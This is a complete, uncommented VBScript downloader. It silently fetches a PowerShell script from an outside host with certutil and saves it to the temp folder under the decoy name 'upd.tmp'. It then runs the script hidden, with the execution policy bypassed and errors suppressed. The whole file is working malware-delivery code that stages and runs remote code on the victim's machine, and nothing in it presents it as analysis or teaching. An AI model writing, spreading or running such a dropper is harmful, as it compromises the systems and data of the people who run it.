On Error Resume Next
Set sh = CreateObject("WScript.Shell")
tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\upd.tmp"
url = "https://3-4px.pages.dev/A.ps1"
sh.Run "certutil -urlcache -split -f " & url & " " & tmp, 0, True
sh.Run "powershell -ExecutionPolicy Bypass -File " & tmp, 0, False